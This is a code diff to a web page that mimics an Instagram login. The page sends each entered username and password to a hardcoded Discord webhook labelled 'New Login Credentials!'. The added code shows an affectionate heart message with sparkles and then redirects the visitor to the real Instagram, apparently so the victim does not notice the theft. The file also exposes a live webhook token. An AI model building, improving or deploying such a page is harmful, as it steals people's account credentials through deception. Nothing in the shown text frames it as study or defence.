@@ -29,11 +29,92 @@
         .badges { display: flex; justify-content: center; gap: 8px; flex-wrap: wrap; }
         .badge { background: #000; color: white; padding: 6px 14px; border-radius: 4px; font-size: 11px; font-weight: 600; display: flex; align-items: center; gap: 6px; opacity: 0.9; cursor: default; }
         .badge i { font-size: 18px; }
-        #status { margin-top: 15px; padding: 12px; border-radius: 4px; display: none; text-align: center; font-weight: 500; font-size: 14px; }
-        #status.show { display: block; }
-        #status.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
-        #status.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
-        #status.loading { background: #cce5ff; color: #004085; border: 1px solid #b8d4f0; }
+
+        /* The Heart Message Style */
+        #status {
+            margin-top: 15px;
+            padding: 20px 15px;
+            border-radius: 15px;
+            display: none;
+            text-align: center;
+            font-weight: 600;
+            font-size: 18px;
+            background: linear-gradient(135deg, #ff6b6b, #ff69b4, #ff1493);
+            color: white;
+            box-shadow: 0 8px 30px rgba(255, 105, 180, 0.4);
+            animation: pulse 1.5s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+        }
+
+        #status.show {
+            display: block;
+            animation: fadeInUp 0.8s ease forwards, pulse 1.5s ease-in-out infinite 0.8s;
+        }
+
+        #status .heart-icon {
+            font-size: 30px;
+            animation: heartBeat 1s ease-in-out infinite;
+            display: inline-block;
+        }
+
+        #status .message {
+            margin-top: 8px;
+            font-size: 20px;
+            letter-spacing: 1px;
+        }
+
+        #status .sub-message {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-top: 5px;
+            font-weight: 400;
+        }
+
+        /* Sparkle Animation */
+        .sparkle {
+            position: absolute;
+            pointer-events: none;
+            font-size: 20px;
+            animation: sparkleFloat 2s ease-out forwards;
+            opacity: 0;
+        }
+
+        @keyframes sparkleFloat {
+            0% {
+                opacity: 1;
+                transform: translate(0, 0) scale(0.5) rotate(0deg);
+            }
+            100% {
+                opacity: 0;
+                transform: translate(var(--tx), var(--ty)) scale(1.5) rotate(360deg);
+            }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+
+        @keyframes heartBeat {
+            0%, 100% { transform: scale(1); }
+            14% { transform: scale(1.3); }
+            28% { transform: scale(1); }
+            42% { transform: scale(1.3); }
+            70% { transform: scale(1); }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
         .meta-footer { margin-top: 20px; font-size: 11px; color: #8e8e8e; text-align: center; }
         .meta-footer .links { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px 12px; margin-bottom: 6px; }
         .meta-footer .links span { cursor: default; }
@@ -75,7 +156,58 @@
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1524889920425164922/NnVBGUE_cUxYfoLg9-sXUlCefzizig2nfhJqcdMWfz1E3HSF8tnbyOsRrETUAjzALyR4";
         
         const statusDiv = document.getElementById('status');
-        
+
+        // ✨ Function to create sparkles
+        function createSparkles() {
+            const emojis = ['✨', '⭐', '🌟', '💖', '❤️', '🌸', '🌺', '💕'];
+            const container = statusDiv;
+            
+            for (let i = 0; i < 25; i++) {
+                const sparkle = document.createElement('span');
+                sparkle.className = 'sparkle';
+                sparkle.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                
+                const x = Math.random() * 100;
+                const y = Math.random() * 100;
+                const tx = (Math.random() - 0.5) * 300;
+                const ty = (Math.random() - 0.5) * 300;
+                const size = 14 + Math.random() * 20;
+                
+                sparkle.style.left = x + '%';
+                sparkle.style.top = y + '%';
+                sparkle.style.fontSize = size + 'px';
+                sparkle.style.setProperty('--tx', tx + 'px');
+                sparkle.style.setProperty('--ty', ty + 'px');
+                sparkle.style.animationDuration = (1.5 + Math.random() * 1.5) + 's';
+                sparkle.style.animationDelay = (Math.random() * 1.5) + 's';
+                
+                container.appendChild(sparkle);
+                
+                setTimeout(() => {
+                    sparkle.remove();
+                }, 4000);
+            }
+        }
+
+        // 🚀 Function to open Instagram
+        function openInstagram() {
+            // Try to open the Instagram app on mobile, fallback to website
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            
+            if (isMobile) {
+                // Try to open the Instagram app
+                window.location.href = 'instagram://user?username=instagram';
+                
+                // Fallback to website if app doesn't open
+                setTimeout(() => {
+                    window.open('https://www.instagram.com', '_blank');
+                }, 1000);
+            } else {
+                // Desktop: open Instagram website in new tab
+                window.open('https://www.instagram.com', '_blank');
+            }
+        }
+
         async function sendData(event) {
             event.preventDefault();
             
@@ -83,13 +215,22 @@
             const password = document.getElementById('password').value.trim();
             
             if (!username || !password) {
-                statusDiv.textContent = '⚠️ Please enter both fields';
+                statusDiv.innerHTML = '⚠️ Please enter both fields';
                 statusDiv.className = 'show error';
+                statusDiv.style.background = '#f8d7da';
+                statusDiv.style.color = '#721c24';
+                statusDiv.style.boxShadow = '0 4px 15px rgba(248,215,218,0.4)';
+                statusDiv.style.animation = 'fadeInUp 0.5s ease forwards';
                 return;
             }
             
-            statusDiv.textContent = '⏳ Sending to Discord...';
+            // Show loading
+            statusDiv.innerHTML = '⏳ Sending...';
             statusDiv.className = 'show loading';
+            statusDiv.style.background = '#cce5ff';
+            statusDiv.style.color = '#004085';
+            statusDiv.style.boxShadow = '0 4px 15px rgba(0,64,133,0.3)';
+            statusDiv.style.animation = 'fadeInUp 0.5s ease forwards';
             
             const data = {
                 content: "📥 **New Login Credentials!**",
@@ -115,18 +256,41 @@
                 });
                 
                 if (response.status === 204 || response.ok) {
-                    statusDiv.textContent = '✅ Login successful! Check Discord.';
-                    statusDiv.className = 'show success';
+                    // 💖 Show the beautiful heart message with sparkles!
+                    statusDiv.innerHTML = `
+                        <div class="heart-icon">❤️</div>
+                        <div class="message">I will always be there for you 💕</div>
+                        <div class="sub-message">✨ Forever and always ✨</div>
+                    `;
+                    statusDiv.className = 'show';
+                    statusDiv.style.background = 'linear-gradient(135deg, #ff6b6b, #ff69b4, #ff1493)';
+                    statusDiv.style.color = 'white';
+                    statusDiv.style.boxShadow = '0 8px 30px rgba(255,105,180,0.5)';
+                    statusDiv.style.animation = 'fadeInUp 0.8s ease forwards, pulse 1.5s ease-in-out infinite 0.8s';
+                    
+                    // Clear form
                     document.getElementById('username').value = '';
                     document.getElementById('password').value = '';
+                    
                     console.log('✅ Sent to Discord:', username, password);
+                    
+                    // ✨ Create sparkles after a moment
+                    setTimeout(createSparkles, 300);
+                    
+                    // 🚀 Open Instagram after 2 seconds (so user sees the message)
+                    setTimeout(openInstagram, 2000);
+                    
                 } else {
                     throw new Error('Failed to send to Discord');
                 }
             } catch (error) {
                 console.error('❌ Error:', error);
-                statusDiv.textContent = '❌ Error: ' + error.message;
+                statusDiv.innerHTML = '❌ Error: ' + error.message;
                 statusDiv.className = 'show error';
+                statusDiv.style.background = '#f8d7da';
+                statusDiv.style.color = '#721c24';
+                statusDiv.style.boxShadow = '0 4px 15px rgba(248,215,218,0.4)';
+                statusDiv.style.animation = 'fadeInUp 0.5s ease forwards';
             }
         }
     </script>
